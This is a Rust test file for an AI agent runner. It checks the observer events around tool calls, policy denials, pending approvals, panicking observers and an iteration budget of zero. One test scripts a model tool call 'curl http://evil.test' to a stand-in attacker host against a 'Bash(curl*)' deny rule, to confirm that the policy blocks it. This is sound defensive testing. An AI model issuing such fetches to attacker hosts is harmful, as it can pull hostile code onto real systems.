use super::support::{
    AgentConfig, AgentError, AgentObserver, AgentRunner, AgentSession, ApprovalChallenge,
    ApprovalResolution, ApprovalResolver, Arc, AssistantContent, CollectingObserver,
    CompositeObserver, EventKind, FakeModel, Mutex, PanicObserver, PolicyEffect, PolicyOrigin,
    ToolRegistry, async_trait, empty_policy, event_label, register_bash, response,
};

struct BlockingApproval {
    entered: Mutex<Option<tokio::sync::oneshot::Sender<()>>>,
    release: Mutex<Option<tokio::sync::oneshot::Receiver<()>>>,
}

#[async_trait]
impl ApprovalResolver for BlockingApproval {
    async fn resolve(&self, _challenge: &ApprovalChallenge) -> ApprovalResolution {
        if let Some(entered) = self.entered.lock().expect("entered lock").take() {
            let _ = entered.send(());
        }
        let release = self.release.lock().expect("release lock").take();
        if let Some(release) = release {
            let _ = release.await;
        }
        ApprovalResolution::Approve { persistence: None }
    }
}

#[tokio::test]
async fn unknown_tool_emits_tool_end_without_tool_start() {
    let model = FakeModel::new([
        response(AssistantContent::tool_call(
            "call_1",
            "ghost",
            serde_json::json!({}),
        )),
        response(AssistantContent::text("ok")),
    ]);
    let observer = Arc::new(CollectingObserver::default());
    let runner = AgentRunner::new(model, ToolRegistry::new()).with_observer(observer.clone());
    let mut session = AgentSession::new();

    runner
        .run_turn(&mut session, "call a ghost")
        .await
        .expect("an unknown tool is model-recoverable");

    let events = observer.events();
    // The tool never resolved, so it gets a ToolEnd with no ToolStart.
    assert!(
        !events
            .iter()
            .any(|e| matches!(e.kind, EventKind::ToolStart { .. }))
    );
    let tool_ends: Vec<_> = events
        .iter()
        .filter(|e| matches!(e.kind, EventKind::ToolEnd { .. }))
        .collect();
    assert_eq!(tool_ends.len(), 1);
    assert!(matches!(
        &tool_ends[0].kind,
        EventKind::ToolEnd { ok: false, error: Some(f), .. } if f.kind.as_str() == "tool_not_found"
    ));
}

#[tokio::test]
async fn permission_denied_emits_failed_tool_end_after_start() {
    let model = FakeModel::new([
        response(AssistantContent::tool_call(
            "call_1",
            "bash",
            serde_json::json!({ "cmd": "curl http://evil.test" }),
        )),
        response(AssistantContent::text("understood")),
    ]);
    let mut registry = ToolRegistry::new();
    register_bash(&mut registry).await;
    let mut policy = empty_policy();
    policy
        .compile_and_push("Bash(curl*)", PolicyEffect::Deny, PolicyOrigin::Project)
        .expect("valid deny rule");
    let observer = Arc::new(CollectingObserver::default());
    let runner = AgentRunner::new(model, registry)
        .with_policy(policy)
        .expect("policy root matches registry")
        .with_observer(observer.clone());
    let mut session = AgentSession::new();

    runner
        .run_turn(&mut session, "fetch the script")
        .await
        .expect("a denial is model-recoverable");

    let events = observer.events();
    // The request was computed, so ToolStart fires before the deny verdict.
    assert!(events.iter().any(|e| matches!(
        &e.kind,
        EventKind::ToolStart { tool_call_id, .. } if tool_call_id == "call_1"
    )));
    let tool_ends: Vec<_> = events
        .iter()
        .filter_map(|e| match &e.kind {
            EventKind::ToolEnd { error, .. } => Some(error.clone()),
            _ => None,
        })
        .collect();
    assert_eq!(tool_ends.len(), 1);
    assert!(matches!(&tool_ends[0], Some(f) if f.kind.as_str() == "permission_denied"));
}

#[tokio::test]
async fn tool_start_is_visible_while_approval_is_still_pending() {
    let model = FakeModel::new([
        response(AssistantContent::tool_call(
            "call_1",
            "bash",
            serde_json::json!({ "cmd": "printf approved" }),
        )),
        response(AssistantContent::text("done")),
    ]);
    let mut registry = ToolRegistry::new();
    register_bash(&mut registry).await;
    let observer = Arc::new(CollectingObserver::default());
    let (entered_tx, entered_rx) = tokio::sync::oneshot::channel();
    let (release_tx, release_rx) = tokio::sync::oneshot::channel();
    let resolver = Arc::new(BlockingApproval {
        entered: Mutex::new(Some(entered_tx)),
        release: Mutex::new(Some(release_rx)),
    });
    let runner = AgentRunner::new(model, registry)
        .with_observer(observer.clone())
        .with_approval_resolver(resolver);
    let task = tokio::spawn(async move {
        let mut session = AgentSession::new();
        let result = runner.run_turn(&mut session, "run it").await;
        (result, session)
    });

    entered_rx
        .await
        .expect("resolver should receive the approval challenge");
    let waiting_events = observer.events();
    assert!(waiting_events.iter().any(|event| matches!(
        &event.kind,
        EventKind::ToolStart { tool_call_id, .. } if tool_call_id == "call_1"
    )));
    assert!(
        !waiting_events
            .iter()
            .any(|event| matches!(event.kind, EventKind::ToolEnd { .. }))
    );

    release_tx.send(()).expect("approval task is waiting");
    let (result, _session) = task.await.expect("runner task joins");
    result.expect("approved run completes");
}

#[tokio::test]
async fn composite_observer_isolates_a_panicking_observer() {
    let model = FakeModel::new([response(AssistantContent::text("done"))]);
    let collecting = Arc::new(CollectingObserver::default());
    let composite = CompositeObserver(vec![
        Arc::new(PanicObserver) as Arc<dyn AgentObserver>,
        collecting.clone(),
    ]);
    let runner = AgentRunner::new(model, ToolRegistry::new()).with_observer(Arc::new(composite));
    let mut session = AgentSession::new();

    let turn = runner
        .run_turn(&mut session, "go")
        .await
        .expect("a panicking observer must not unwind the turn");
    assert_eq!(turn.final_text(&session), "done");

    // The healthy observer still received the full stream.
    let kinds: Vec<_> = collecting
        .events()
        .iter()
        .map(|e| event_label(&e.kind))
        .collect();
    assert_eq!(kinds, vec!["model_start", "assistant"]);
}

#[tokio::test]
async fn bare_panicking_observer_does_not_unwind_the_runner() {
    // A bare (non-composite) observer has no isolation of its own, so a
    // surviving turn proves `emit` itself swallows the panic — a rendering
    // frontend must never be able to crash the agent loop.
    let model = FakeModel::new([response(AssistantContent::text("done"))]);
    let runner =
        AgentRunner::new(model, ToolRegistry::new()).with_observer(Arc::new(PanicObserver));
    let mut session = AgentSession::new();

    let turn = runner
        .run_turn(&mut session, "go")
        .await
        .expect("a panicking bare observer must not unwind the turn");
    assert_eq!(turn.final_text(&session), "done");
}

#[tokio::test]
async fn pre_iteration_error_carries_no_iteration() {
    let observer = Arc::new(CollectingObserver::default());
    let runner = AgentRunner::with_config(
        FakeModel::default(),
        ToolRegistry::new(),
        AgentConfig {
            max_iterations: 0,
            ..AgentConfig::default()
        },
    )
    .with_observer(observer.clone());
    let mut session = AgentSession::new();

    let err = runner
        .run_turn(&mut session, "go")
        .await
        .expect_err("a zero iteration budget cannot complete");
    assert!(matches!(err, AgentError::MaxIterations { .. }));

    let events = observer.events();
    // The model was never called, so the only event is the terminal Error,
    // which has no owning model call — `iteration` is `None`, not `Some(0)`.
    assert_eq!(events.len(), 1);
    assert_eq!(events[0].iteration, None);
    assert!(matches!(
        &events[0].kind,
        EventKind::Error { kind, .. } if kind == "max_iterations"
    ));
}
